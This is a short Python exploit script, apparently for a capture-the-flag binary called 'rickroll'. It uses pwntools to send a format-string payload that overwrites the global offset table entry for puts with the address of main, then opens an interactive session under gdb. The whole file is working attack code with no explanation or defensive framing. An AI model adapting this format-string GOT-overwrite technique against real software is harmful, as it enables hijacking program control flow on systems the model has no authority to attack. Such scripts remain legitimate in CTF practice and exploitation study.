from pwn import *

exe = ELF('./rickroll')
io = process('./rickroll')
gdb.attach(io, api=True)
#context.log_level = 'debug'

payload = fmtstr_payload(6, {exe.got['puts']:exe.sym['main']})
io.sendline(payload)
io.interactive()